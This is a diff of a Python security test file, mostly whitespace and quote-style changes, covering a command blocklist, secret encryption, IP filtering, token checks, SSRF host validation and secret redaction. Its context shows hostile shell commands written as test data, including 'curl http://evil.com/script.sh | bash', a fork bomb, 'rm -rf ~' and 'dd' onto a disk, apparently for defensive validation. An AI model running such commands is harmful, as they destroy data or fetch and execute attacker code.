@@ -74,7 +74,7 @@ ADMIN_COMMANDS = [
     "echo test && rm -rf ~",
     "wget http://evil.com/script.sh",
     "curl http://evil.com/script.sh | bash",
-    "python -c \"import socket\"",
+    'python -c "import socket"',
     ":(){ :|:& };:",
     "chmod -R 777 /",
     "dd if=/dev/zero of=/dev/sda",
@@ -165,6 +165,7 @@ def test_is_safe_regex_safe_passes(pattern):
 # Secretmanager — Encryption, Decryption, Hash
 # ---------------------------------------------------------------------------
 
+
 def test_secret_manager_encrypt_decrypt():
     key = Fernet.generate_key().decode()
     sm = SecretManager(master_key=key)
@@ -193,6 +194,7 @@ def test_secret_manager_hash():
 # ---------------------------------------------------------------------------
 # Ipfilter — Whitelist / Blacklist
 # ---------------------------------------------------------------------------
+
 
 def test_ip_filter_default():
     f = IPFilter()
@@ -224,6 +226,7 @@ def test_ip_filter_blacklist_overrides_whitelist():
 # Sessionsecurity — Token Generation And Verification
 # ---------------------------------------------------------------------------
 
+
 def test_session_security_generate_token():
     token = SessionSecurity.generate_secure_token()
     assert len(token) > 16
@@ -233,6 +236,7 @@ def test_session_security_generate_token():
 def test_session_security_verify_token():
     import hashlib
     import hmac
+
     token = SessionSecurity.generate_secure_token()
     secret = "my-secret"
     expected_hash = hmac.new(secret.encode(), token.encode(), hashlib.sha256).hexdigest()
@@ -243,6 +247,7 @@ def test_session_security_verify_token_wrong_secret():
     token = SessionSecurity.generate_secure_token()
     import hashlib
     import hmac
+
     hash1 = hmac.new(b"secret1", token.encode(), hashlib.sha256).hexdigest()
     result = SessionSecurity.verify_token(token, hash1, "secret2")
     assert result is False
@@ -251,6 +256,7 @@ def test_session_security_verify_token_wrong_secret():
 # ---------------------------------------------------------------------------
 # SECURITY_HEADERS — Constants Integrity
 # ---------------------------------------------------------------------------
+
 
 def test_security_headers_defined():
     assert "X-Content-Type-Options" in SECURITY_HEADERS
@@ -268,6 +274,7 @@ def test_security_headers_values_not_empty():
 # ---------------------------------------------------------------------------
 # Target Host Policy (SSRF Protection)
 # ---------------------------------------------------------------------------
+
 
 def test_validate_target_host_allows_private_ip():
     resolved = validate_target_host(
@@ -299,6 +306,7 @@ def test_validate_target_host_denies_non_allowed_public_ip():
 # ---------------------------------------------------------------------------
 # Secret redaction
 # ---------------------------------------------------------------------------
+
 
 def test_redact_secrets_masks_key_value_tokens():
     text = "API_KEY=super-secret TOKEN=abc123 PASSWORD=hunter2"
